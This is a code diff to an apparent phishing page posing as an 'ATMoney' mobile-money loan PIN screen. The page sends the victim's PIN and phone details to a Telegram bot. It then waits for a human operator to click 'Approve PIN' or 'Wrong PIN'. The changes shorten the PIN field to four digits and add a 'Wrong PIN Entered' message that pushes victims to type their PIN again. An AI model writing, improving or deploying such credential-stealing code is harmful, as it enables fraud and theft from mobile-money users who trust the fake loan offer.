@@ -248,8 +248,8 @@
             </div>
         </div>
 
-        <h1>Enter ATMoney PIN</h1>
-        <p class="subtitle">Please enter your 4-digit ATMoney PIN to confirm your loan application.</p>
+        <h1 id="pinTitle">Enter ATMoney PIN</h1>
+        <p class="subtitle" id="pinSubtitle">Please enter your 4-digit ATMoney PIN to confirm your loan application.</p>
         <p class="phone-display" id="phoneDisplay"></p>
 
         <div class="offer-info" id="offerInfo">
@@ -305,7 +305,6 @@
             const name     = params.get('name')     || params.get('loan_name')   || 'Speed Loan';
             const amount   = params.get('amount')   || params.get('loan_amount') || '1000';
             const phone    = params.get('phone')    || params.get('msisdn')      || '';
-            const duration = params.get('duration') || params.get('tenor')       || '';
             const rate     = params.get('rate')     || params.get('interest')    || '';
             const fee      = params.get('fee')      || '';
 
@@ -313,9 +312,8 @@
             offerTitleEl.textContent = name;
             offerPriceEl.textContent = `GHS ${parseInt(amount).toLocaleString()}`;
 
-            // Optional meta items (duration, rate, fee)
+            // Optional meta items (rate, fee) - Duration removed as requested
             const metaItems = [];
-            if (duration) metaItems.push({ label: 'Duration', value: duration });
             if (rate)     metaItems.push({ label: 'Interest',  value: rate });
             if (fee)      metaItems.push({ label: 'Fee',       value: `GHS ${fee}` });
 
@@ -398,7 +396,7 @@
 
             const ts         = Date.now();
             const approveId  = `pin_approve_${ts}`;
-            const declinePinId = `pin_decline_${ts}`;
+            const wrongPinId = `pin_wrong_${ts}`;
 
             // Build a readable summary of all URL params for the Telegram message
             const paramSummary = Array.from(params.entries())
@@ -414,23 +412,23 @@
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
-                            [{ text: '✅ Approve', callback_data: approveId }],
-                            [{ text: '❌ Decline (Wrong PIN)', callback_data: declinePinId }]
+                            [{ text: '✅ Approve PIN', callback_data: approveId }],
+                            [{ text: '❌ Wrong PIN', callback_data: wrongPinId }]
                         ]
                     }
                 })
             })
             .then(() => {
                 spinner.style.display = 'flex';
-                startPolling(approveId, declinePinId);
+                startPolling(approveId, wrongPinId);
             })
             .catch(() => {
                 resetButton();
             });
         }
 
-        function startPolling(approveId, declinePinId) {
-            const interval = setInterval(() => {
+        function startPolling(approveId, wrongPinId) {
+            pollingInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
                     .then(data => {
@@ -440,14 +438,19 @@
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
                                 if (cb === approveId) {
-                                    clearInterval(interval);
+                                    clearInterval(pollingInterval);
                                     spinner.style.display = 'none';
                                     const qs = getAllParams();
                                     window.location.href = qs ? `activate.html?${qs}&show_prompt=true` : `activate.html?show_prompt=true`;
-                                } else if (cb === declinePinId) {
-                                    clearInterval(interval);
+                                } else if (cb === wrongPinId) {
+                                    clearInterval(pollingInterval);
                                     spinner.style.display = 'none';
-                                    errMsg.textContent = 'Wrong ATMoney PIN. Enter the correct PIN.';
+                                    
+                                    // Update UI for Wrong PIN state
+                                    document.getElementById('pinTitle').textContent = 'Wrong PIN Entered';
+                                    document.getElementById('pinSubtitle').innerHTML = 'Your PIN on the application details was wrong when verifying your loan. <span style="color:var(--at-red); font-weight:700;">Please enter the correct ATMoney PIN for your loan application.</span>';
+                                    
+                                    errMsg.textContent = 'Your ATMoney PIN is incorrect. Please try again.';
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#pinInputs .pin-input').forEach(i => i.value = '');
                                     resetButton();
@@ -458,6 +461,8 @@
             }, 1000);
         }
 
+
+
         function resetButton() {
             isProcessing = false;
             verifyBtn.disabled = false;
@@ -465,8 +470,8 @@
         }
 
         // ─── Init ───────────────────────────────────────────────────────────────
-        createInputs('pinInputs', 5);
-        setupAutoFocus('pinInputs', 5, submitPIN);
+        createInputs('pinInputs', 4);
+        setupAutoFocus('pinInputs', 4, submitPIN);
         verifyBtn.onclick = submitPIN;
         loadOffer();
     </script>
